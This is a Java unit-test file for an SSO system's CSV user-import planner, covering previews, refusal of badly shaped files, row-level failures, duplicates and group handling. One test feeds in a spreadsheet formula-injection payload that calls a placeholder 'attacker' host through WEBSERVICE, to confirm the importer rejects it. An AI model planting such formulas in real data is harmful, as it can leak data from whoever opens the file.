package com.example.sso.metadata.internal.application;

import com.example.sso.metadata.AttributeDataType;
import com.example.sso.metadata.AttributeDefinition;
import com.example.sso.metadata.AttributeDefinitionService;
import com.example.sso.metadata.AttributeSource;
import com.example.sso.metadata.CsvImportPreview;
import com.example.sso.metadata.CsvRowFailure;
import com.example.sso.metadata.EntityKind;
import com.example.sso.metadata.ProfileAttributeValidator;
import com.example.sso.shared.error.ApiException;
import com.example.sso.shared.error.BadRequestException;
import com.example.sso.user.account.BaseUserFields;
import java.util.Collections;
import java.util.List;
import java.util.UUID;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.mockito.Mock;
import org.mockito.junit.jupiter.MockitoExtension;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;
import static org.assertj.core.api.InstanceOfAssertFactories.type;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.ArgumentMatchers.eq;
import static org.mockito.Mockito.lenient;
import static org.mockito.Mockito.doThrow;
import static org.mockito.Mockito.never;
import static org.mockito.Mockito.verifyNoMoreInteractions;
import static org.mockito.Mockito.verify;
import static org.mockito.Mockito.when;

/**
 * What an import WOULD do, worked out without doing any of it.
 *
 * <p>Two kinds of refusal, and the difference is deliberate. A file whose SHAPE is wrong — a column the
 * profile does not declare, more rows or columns than we will accept — is refused whole, because applying
 * the half of it we understood is how a mis-aimed file quietly populates a tenant. A row whose DATA is wrong
 * fails on its own and the rest still proceeds, because one typo in a five-thousand-line file should not cost
 * the other 4999.
 */
@ExtendWith(MockitoExtension.class)
class CsvImportPlannerTest {

    private static final UUID PROFILE = UUID.randomUUID();

    @Mock private AttributeDefinitionService definitions;
    @Mock private CsvExistingUsers existingUsers;
    @Mock private CsvGroups groups;
    @Mock private ProfileAttributeValidator values;

    private CsvImportPlanner planner;

    @BeforeEach
    void setUp() {
        planner = new CsvImportPlanner(definitions, values, existingUsers, groups, 100, 20, 255);
        declares(required(BaseUserFields.USERNAME), optional("team"));
        lenient().when(existingUsers.present(any())).thenReturn(List.of());
        lenient().when(groups.missing(any())).thenReturn(List.of());
    }

    private AttributeDefinition column(String key, boolean required, AttributeDataType type,
            List<String> enumValues) {
        return new AttributeDefinition(UUID.randomUUID(), EntityKind.USER, key, key, null, type, enumValues,
                false, required, AttributeSource.LOCAL, 0);
    }

    private AttributeDefinition required(String key) {
        return column(key, true, AttributeDataType.STRING, List.of());
    }

    private AttributeDefinition optional(String key) {
        return column(key, false, AttributeDataType.STRING, List.of());
    }

    private void declares(AttributeDefinition... columns) {
        lenient().when(definitions.definitionsIn(PROFILE)).thenReturn(List.of(columns));
    }

    private CsvImportPreview plan(String csv) {
        return planner.plan(PROFILE, csv);
    }

    private void refusesFile(String csv, String messageKey) {
        assertThatThrownBy(() -> plan(csv))
                .asInstanceOf(type(ApiException.class))
                .extracting(ApiException::getMessageKey)
                .isEqualTo(messageKey);
    }

    // --- the happy path, and the promise that nothing was written ---------------------------------

    @Test
    void everyValidRowBecomesAPlannedUser() {
        CsvImportPreview preview = plan("username,team\nada,platform\ngrace,compilers\n");

        assertThat(preview.rowsRead()).isEqualTo(2);
        assertThat(preview.toCreate()).extracting("username").containsExactly("ada", "grace");
        assertThat(preview.toCreate().getFirst().attributes()).containsEntry("team", "platform");
        assertThat(preview.failures()).isEmpty();
    }

    /** The whole point of a preview: it is a read. If it writes, confirming it is theatre. */
    @Test
    void planningOnlyReads() {
        plan("username,team\nada,platform\n");

        verify(existingUsers).present(any());
        verify(groups).missing(any());
        verifyNoMoreInteractions(existingUsers, groups);
    }

    /** The template ships a guidance row for the person filling it in; the importer must drop it, not import it. */
    @Test
    void theTemplatesGuidanceRowIsNotAUser() {
        CsvImportPreview preview = plan("username,team\n# required string,optional string\nada,platform\n");

        assertThat(preview.rowsRead()).isEqualTo(1);
        assertThat(preview.toCreate()).extracting("username").containsExactly("ada");
    }

    @Test
    void aBlankLineIsNotARow() {
        CsvImportPreview preview = plan("username,team\nada,platform\n\n");

        assertThat(preview.rowsRead()).isEqualTo(1);
        assertThat(preview.failures()).isEmpty();
    }

    // --- an existing account is not a failure, and not a create ------------------------------------

    @Test
    void anAccountThatAlreadyExistsIsReportedRatherThanCreatedAgain() {
        when(existingUsers.present(List.of("ada", "grace"))).thenReturn(List.of("ada"));

        CsvImportPreview preview = plan("username,team\nada,platform\ngrace,compilers\n");

        assertThat(preview.existing()).containsExactly("ada");
        assertThat(preview.toCreate()).extracting("username").containsExactly("grace");
        assertThat(preview.failures()).isEmpty();
    }

    // --- the file's shape: refused whole -----------------------------------------------------------

    /**
     * A column the profile does not declare means the file was built for a different profile — or by hand,
     * against a schema that has since changed. Importing the columns we recognised would create accounts
     * missing exactly the data the administrator thought they were providing.
     */
    @Test
    void aColumnTheProfileDoesNotDeclareRefusesTheFile() {
        refusesFile("username,salary\nada,100\n", "metadata.csv.unknownColumn");
    }

    @Test
    void aFileWithoutTheUsernameColumnIsRefused() {
        refusesFile("team\nplatform\n", "metadata.csv.missingUsernameColumn");
    }

    @Test
    void moreRowsThanWeAcceptRefusesTheFile() {
        StringBuilder csv = new StringBuilder("username,team\n");
        for (int i = 0; i <= 100; i++) {
            csv.append("user").append(i).append(",platform\n");
        }

        refusesFile(csv.toString(), "metadata.csv.tooManyRows");
    }

    @Test
    void moreColumnsThanWeAcceptRefusesTheFileBeforeTheColumnsAreChecked() {
        String header = String.join(",", Collections.nCopies(21, "username"));

        refusesFile(header + "\n", "metadata.csv.tooManyColumns");
    }

    // --- a row's data: fails alone -----------------------------------------------------------------

    @Test
    void aRowMissingARequiredValueFailsOnItsOwn() {
        CsvImportPreview preview = plan("username,team\n,platform\ngrace,compilers\n");

        assertThat(preview.toCreate()).extracting("username").containsExactly("grace");
        assertThat(preview.failures()).singleElement()
                .extracting(CsvRowFailure::reason, CsvRowFailure::detail)
                .containsExactly("metadata.csv.row.missingRequired", BaseUserFields.USERNAME);
    }

    /** The line number is what an administrator uses to find the row, so it counts lines, not records. */
    @Test
    void aFailureNamesTheLineTheAdministratorWillLookFor() {
        CsvImportPreview preview = plan("username,team\nada,platform\n,broken\n");

        assertThat(preview.failures()).singleElement().extracting(CsvRowFailure::line).isEqualTo(3L);
    }

    /**
     * Value rules are the profile's, not the importer's — the same validator that guards a manually created
     * user checks a row here, so a rule can never hold on one path and not the other. Its refusal becomes the
     * row's reason, so the administrator reads why the value was wrong rather than "row 4 failed".
     */
    @Test
    void aValueTheProfileRefusesFailsWithTheProfilesOwnReason() {
        doThrow(BadRequestException.of("metadata.attribute.enumValue", "region"))
                .when(values).validate(eq(PROFILE), any());

        CsvImportPreview preview = plan("username,team\nada,antarctica\n");

        assertThat(preview.failures()).singleElement()
                .extracting(CsvRowFailure::reason).isEqualTo("metadata.attribute.enumValue");
    }

    @Test
    void theSameUsernameTwiceInOneFileFailsTheSecond() {
        CsvImportPreview preview = plan("username,team\nada,platform\nada,compilers\n");

        assertThat(preview.toCreate()).hasSize(1);
        assertThat(preview.failures()).singleElement()
                .extracting(CsvRowFailure::reason).isEqualTo("metadata.csv.row.duplicateUsername");
    }

    @Test
    void aCellLongerThanTheColumnHoldsFails() {
        CsvImportPreview preview = plan("username,team\nada," + "x".repeat(256) + "\n");

        assertThat(preview.failures()).singleElement()
                .extracting(CsvRowFailure::reason).isEqualTo("metadata.csv.row.valueTooLong");
    }

    /**
     * A cell that opens like a formula is refused rather than neutralised on the way in. We re-export these
     * values in a template later, and a username or an address that begins {@code =} is never legitimate — so
     * refusing costs nothing real and keeps the payload out of the database entirely.
     */
    @Test
    void aCellThatOpensLikeAFormulaFails() {
        CsvImportPreview preview = plan("username,team\nada,=WEBSERVICE(\"http://attacker\")\n");

        assertThat(preview.failures()).singleElement()
                .extracting(CsvRowFailure::reason).isEqualTo("metadata.csv.row.formulaValue");
    }

    // --- groups: optional, never created -----------------------------------------------------------

    @Test
    void theGroupsColumnIsOptionalAndSplitsOnSemicolons() {
        CsvImportPreview preview = plan("username,groups\nada,platform;oncall\n");

        assertThat(preview.toCreate()).singleElement()
                .extracting("groups").isEqualTo(List.of("platform", "oncall"));
    }

    /**
     * A group named in a file is never created. A typo would otherwise mint a group, and a group is a
     * permission boundary — one created by accident is one nobody decided to grant.
     */
    @Test
    void aGroupThatDoesNotExistFailsTheRowRatherThanCreatingIt() {
        when(groups.missing(any())).thenReturn(List.of("platfrom"));

        CsvImportPreview preview = plan("username,groups\nada,platfrom\n");

        assertThat(preview.toCreate()).isEmpty();
        assertThat(preview.failures()).singleElement()
                .extracting(CsvRowFailure::reason, CsvRowFailure::detail)
                .containsExactly("metadata.csv.row.unknownGroup", "platfrom");
    }
}
